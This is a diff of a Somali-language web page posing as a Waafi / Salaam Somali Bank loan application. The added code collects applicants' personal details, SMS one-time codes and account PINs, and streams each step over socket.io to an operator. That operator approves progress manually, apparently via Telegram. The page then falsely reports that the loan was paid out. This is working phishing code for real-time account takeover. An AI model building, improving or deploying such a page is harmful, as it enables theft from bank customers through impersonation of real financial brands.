@@ -2,38 +2,91 @@
 <html lang="so">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#74b927">
     <title>Waafi Loans</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
-        /* Exact background logic mirroring the Congo project layout architecture */
+        [x-cloak] { display: none !important; }
+        /* Exact background logic matching the requested design: green on top, orange on bottom */
         body {
             background: linear-gradient(to bottom, #15803d 0%, #166534 40%, #c2410c 70%, #9a3412 100%);
             background-attachment: fixed;
             font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
         }
-        input:focus, select:focus {
+        input:focus, select:focus, textarea:focus {
             outline: none;
             border-color: #74b927;
             box-shadow: 0 0 0 2px rgba(116, 185, 39, 0.2);
         }
+        .pin-box { 
+            width: 54px; 
+            height: 54px; 
+            border: 1.5px solid #e2e8f0; 
+            border-radius: 12px; 
+            text-align: center; 
+            font-size: 24px; 
+            font-weight: 700; 
+            background: #f8fafc; 
+            color: #0f172a; 
+            outline: none; 
+            transition: all 0.2s; 
+        }
+        .pin-box:focus { 
+            border-color: #74b927; 
+            background: white; 
+            box-shadow: 0 0 0 4px rgba(116, 185, 39, 0.1); 
+        }
+        .spinner-sm { 
+            animation: spin 1s linear infinite; 
+            width: 20px; 
+            height: 20px; 
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-top-color: white; 
+            border-radius: 50%; 
+            display: inline-block; 
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .toast { 
+            position: absolute; 
+            top: 16px; 
+            left: 50%; 
+            transform: translateX(-50%) translateY(-10px); 
+            padding: 12px 24px; 
+            border-radius: 8px; 
+            background: #1e293b; 
+            color: white; 
+            font-size: 13px; 
+            font-weight: 600; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
+            z-index: 9999; 
+            opacity: 0; 
+            transition: all 0.25s ease; 
+            white-space: nowrap; 
+            pointer-events: none; 
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-0 sm:p-4">
 
-    <div class="w-full max-w-md bg-[#f8fafc] sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col min-h-screen sm:min-h-[850px] relative">
+    <div class="w-full max-w-md bg-[#f8fafc] sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col min-h-screen sm:min-h-[850px] relative" x-data="loanFlow()" x-init="init()">
         
+        <div id="toast" class="toast" :class="toast.show ? 'show' : ''" x-text="toast.message"></div>
+
         <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
             <div class="px-6 py-5 flex items-center justify-center gap-6">
                 <div class="flex items-center justify-end">
-                    <img src="assets/waafi.svg" alt="Waafi" class="h-20 w-auto object-contain max-w-[220px]">
+                    <img src="assets/waafi.svg" alt="Waafi" class="h-20 w-auto object-contain max-w-[220px]" onerror="this.src='https://images.squarespace-cdn.com/content/v1/5fbfbce15bd2fe18bf0a0c44/1614766100561-1GOMR1U44Z9N7Z1C0U4X/waafi.png'">
                 </div>
                 
                 <div class="h-14 w-px bg-gray-300"></div>
                 
                 <div class="flex items-center justify-start">
-                    <img src="assets/salaamlogo.webp" alt="Salaam Somali Bank" class="h-16 w-auto object-contain max-w-[260px]">
+                    <img src="assets/salaamlogo.webp" alt="Salaam Somali Bank" class="h-16 w-auto object-contain max-w-[260px]" onerror="this.src='https://salaambank.so/wp-content/uploads/2021/02/salaam-logo.png'">
                 </div>
             </div>
             
@@ -66,18 +119,18 @@
                     
                     <div class="flex items-baseline gap-2 mt-1">
                         <span class="text-sm font-bold text-emerald-200">USD</span>
-                        <span class="text-4xl font-black tracking-tight">300</span>
-                        <span class="bg-white/20 text-[10px] font-bold px-2 py-0.5 rounded ml-1">1 BIL</span>
+                        <span class="text-4xl font-black tracking-tight" x-text="Number(form.amount).toLocaleString()">300</span>
+                        <span class="bg-white/20 text-[10px] font-bold px-2 py-0.5 rounded ml-1" x-text="form.term ? form.term + ' BIL' : '--'">1 BIL</span>
                     </div>
                     
                     <div class="grid grid-cols-3 gap-2 mt-5 pt-4 border-t border-white/10 text-left">
                         <div>
                             <p class="text-[9px] font-bold text-emerald-200 uppercase tracking-wider">BISHIIBA</p>
-                            <p class="text-sm font-extrabold mt-0.5">$307.50</p>
+                            <p class="text-sm font-extrabold mt-0.5" x-text="'$' + calculateMonthlyInstallment()">$307.50</p>
                         </div>
                         <div class="text-center">
                             <p class="text-[9px] font-bold text-emerald-200 uppercase tracking-wider">MUDDADA</p>
-                            <p class="text-sm font-extrabold mt-0.5">1 bil</p>
+                            <p class="text-sm font-extrabold mt-0.5" x-text="form.term ? form.term + ' bil' : '--'">1 bil</p>
                         </div>
                         <div class="text-right">
                             <p class="text-[9px] font-bold text-emerald-200 uppercase tracking-wider">FAA'IIDADA</p>
@@ -90,55 +143,207 @@
         <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between">
             
             <div class="w-full flex justify-center items-center gap-2 mb-6">
-                <span class="w-2.5 h-2.5 rounded-full bg-emerald-200"></span>
-                <span class="w-2.5 h-2.5 rounded-full bg-emerald-200"></span>
-                <span class="w-2.5 h-2.5 rounded-full bg-[#74b927]"></span>
-                <span class="w-2.5 h-2.5 rounded-full bg-gray-200"></span>
-                <span class="w-2.5 h-2.5 rounded-full bg-gray-200"></span>
+                <template x-for="i in 5" :key="i">
+                    <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#74b927] scale-120': step === i, 'bg-emerald-200': step > i, 'bg-gray-200': step < i }"></div>
+                </template>
             </div>
 
             <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-between">
                 
-                <div>
+                <div x-show="step === 1" x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Nooca Amaahda iyo Muddada</h2>
+                        <p class="text-xs text-gray-400 mt-1">Fadlan dooro nooca amaahda aad u baahan tahay iyo muddada.</p>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Nooca Amaahda</label>
+                        <div class="relative">
+                            <select x-model="form.loanType" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium appearance-none transition-all">
+                                <option value="">Dooro nooca amaahda...</option>
+                                <option value="Personal">Amaahda Shakhsiga (Personal Loan)</option>
+                                <option value="Business">Amaahda Ganacsiga (Business Loan)</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                            </div>
+                        </div>
+                    </div>
+<div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Xaddiga Amaahda</label>
+                        <div class="relative flex items-center h-6">
+                            <input type="range" x-model="form.amount" min="30" max="5000" step="100" 
+                                class="w-full h-2 bg-orange-600 rounded-lg appearance-none cursor-pointer accent-orange-700 relative z-10"
+                                style="-webkit-appearance: none; appearance: none;">
+                        </div>
+                        <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
+                            <span>$30</span>
+                            <span>$5,000</span>
+                        </div>
+                    </div>
+                 
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Muddada Pagbixinta</label>
+                        <div class="relative">
+                            <select x-model="form.term" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium appearance-none transition-all">
+                                <option value="">Dooro muddada...</option>
+                                <option value="1">1 Bilood</option>
+                                <option value="2">2 Bilood</option>
+                                <option value="4">4 Bilood</option>
+                                <option value="6">6 Bilood</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Ujeedada Amaahda</label>
+                        <textarea x-model="form.purpose" rows="3" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 placeholder-gray-400 font-medium transition-all resize-none" placeholder="Si kooban u sharax ujeedadaada"></textarea>
+                    </div>
+
+                    <div class="pt-4">
+                        <button @click="submitStep1" :disabled="!isStep1Valid" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            Sii wad →
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2" x-cloak x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Macluumaadka Shakhsiga</h2>
+                        <p class="text-xs text-gray-400 mt-1">Geli macluumaadkaaga hoose si loo xaqiijiyo galkaaga.</p>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Magaca Hore</label>
+                            <input type="text" x-model="form.firstName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all" placeholder="Magaca hore">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Magaca Dambe</label>
+                            <input type="text" x-model="form.lastName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all" placeholder="Magaca dambe">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Email-kaaga</label>
+                        <input type="email" x-model="form.email" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all" placeholder="tusaale@gmail.com">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Lambarka Telefoonka</label>
+                        <div class="flex gap-2">
+                            <span class="w-28 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇸🇴 +252</span>
+                            <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXX" maxlength="9">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 1" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="submitStep2" :disabled="!isStep2Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            Sii wad →
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 3" x-cloak x-transition.duration.200ms class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaaladda Shaqada & Koontada</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli macluumaadka si aad u xaqiijiso xiriirka Salaam Bank.</p>
                     </div>
 
-                    <div class="space-y-5">
-                        <div>
-                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Nooca Shaqada</label>
-                            <div class="relative">
-                                <select class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium appearance-none transition-all">
-                                    <option value="employed">Shaqaale (Employed)</option>
-                                    <option value="unemployed">Aan shaqayn (Unemployed)</option>
-                                    <option value="business">Ganacsade (Business Owner)</option>
-                                </select>
-                                <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
-                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-                                </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">NOOCA SHAQADA</label>
+                        <div class="relative">
+                            <select x-model="form.employment" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium appearance-none transition-all">
+                                <option value="">Dooro xaaladdaada...</option>
+                                <option value="Employed">Shaqaale (Employed)</option>
+                                <option value="Self-Employed">Ganacsade Gaar ah (Self-Employed)</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                             </div>
                         </div>
+                    </div>
 
-                        <div>
-                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Dakhliga Sanadlaha ($)</label>
-                            <input type="number" placeholder="123" value="123" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all">
-                        </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">DAKHLIGA SANADLAHA ($)</label>
+                        <input type="number" x-model="form.income" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all" placeholder="Dakhliga sanadka ($)">
+                    </div>
 
-                        <div>
-                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Fure-ha Sirta ah (Password)</label>
-                            <input type="password" placeholder="Geli password-kaaga" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 placeholder-gray-400 font-medium transition-all">
-                        </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">MAGACA LOO-SHAQEEYAHA (OPTIONAL)</label>
+                        <input type="text" x-model="form.employer" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 placeholder-gray-400 font-medium transition-all" placeholder="Geli magaca shirkadda (Haddii ay jirto)">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 2" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="submitStep3" :disabled="!isStep3Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            Gudbi Codsiga →
+                        </button>
                     </div>
                 </div>
 
-                <div class="grid grid-cols-2 gap-4 mt-8">
-                    <button type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
-                        ← Dib
-                    </button>
-                    <button type="submit" class="w-full bg-[#74b927] hover:bg-[#66a322] active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                        Gudbi Codsiga →
-                    </button>
+                <div x-show="step === 4" x-cloak x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaqiijinta Code-ka (OTP)</h2>
+                        <p class="text-xs text-gray-400 mt-1">Fadlan geli 6-da nambar ee SMS-ka kuugu soo dhacay si loo hubiyo.</p>
+                    </div>
+
+                    <div>
+                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 3" :disabled="otpVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="verifyOTP" :disabled="otp.code.length !== 6 || otpVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!otpVerifying">Hubi Code-ka →</span>
+                            <span x-show="otpVerifying" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli PIN-ka Koontada</h2>
+                        <p class="text-xs text-gray-400 mt-1">Geli 4-ta nambar ee sirta ah si loo dhammaystiro bixinta lacagta.</p>
+                    </div>
+
+                    <div class="flex justify-center gap-3 py-2">
+                        <template x-for="(_, i) in 4" :key="i">
+                            <input type="password" class="pin-box text-gray-700" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i)" x-model="pin.value[i]">
+                        </template>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 4" :disabled="pinVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!pinVerifying">Dhammaystir</span>
+                            <span x-show="pinVerifying" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 6" x-cloak class="text-center py-8 space-y-5">
+                    <div class="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto text-3xl text-emerald-600">✓</div>
+                    <div>
+                        <h2 class="text-2xl font-black text-emerald-600">Si Guul Leh Ayaa Loogu Diray!</h2>
+                        <p class="text-sm text-gray-500 mt-1">Codsigaaga maalgelineed waa la oggolaaday, waxaana lagu shubay koontadaada.</p>
+                    </div>
+                    <div class="bg-gray-50 border border-gray-100 p-4 rounded-xl inline-block mx-auto">
+                        <p class="text-xs font-bold text-gray-400 uppercase tracking-wider">Tixraaca (Reference ID)</p>
+                        <p class="font-mono text-base font-bold text-gray-800 mt-0.5" x-text="referenceId"></p>
+                    </div>
                 </div>
 
             </div>
@@ -152,5 +357,75 @@
 
     </div>
 
+    <script>
+        function loanFlow() {
+            return {
+                step: 1, appId: '', referenceId: '', connected: false,
+                form: { loanType: '', amount: 1200, term: '1', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
+                otp: { code: '' },
+                pin: { value: ['', '', '', ''] },
+                otpVerifying: false, pinVerifying: false, socket: null, toast: { show: false, message: '' },
+
+                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
+                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isPinValid() { return this.pin.value.join('').length === 4; },
+
+                calculateMonthlyInstallment() {
+                    let principal = Number(this.form.amount) || 0;
+                    let months = Number(this.form.term) || 1;
+                    let totalInterest = principal * (0.025 * months);
+                    let totalPayable = principal + totalInterest;
+                    return (totalPayable / months).toFixed(2);
+                },
+
+                init() {
+                    this.socket = io();
+                    this.socket.on('connect', () => { this.connected = true; });
+                    this.socket.on('session-ready', (data) => { this.appId = data.appId; this.socket.emit('join-room', data.appId); });
+                    
+                    this.socket.on('admin-approve-otp', () => { 
+                        this.otpVerifying = false; 
+                        this.step = 5; 
+                    });
+                    
+                    this.socket.on('admin-approve-pin', (d) => { 
+                        this.pinVerifying = false; 
+                        this.referenceId = d.referenceId || 'TX-' + Math.floor(100000 + Math.random() * 900000);
+                        this.step = 6; 
+                    });
+                    
+                    this.socket.on('admin-reject', (err) => {
+                        this.otpVerifying = false;
+                        this.pinVerifying = false;
+                        this.triggerToastNotification(err.message || "Xaqiijinta waa laga diaday Telegram-ka");
+                    });
+                },
+
+                submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
+                submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
+                submitStep3() { this.socket.emit('step3-data', this.form); this.step = 4; },
+                
+                verifyOTP() { 
+                    this.otpVerifying = true; 
+                    this.socket.emit('step4-otp', { otp: this.otp.code }); 
+                },
+                submitStep5() { 
+                    this.pinVerifying = true; 
+                    this.socket.emit('step5-pin', { pin: this.pin.value.join('') }); 
+                },
+                
+                movePinFocus(e, i) { 
+                    e.target.value = e.target.value.replace(/\D/g, "");
+                    if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); 
+                },
+                triggerToastNotification(msg) {
+                    this.toast.message = msg;
+                    this.toast.show = true;
+                    setTimeout(() => { this.toast.show = false; }, 4000);
+                }
+            }
+        }
+    </script>
 </body>
 </html>
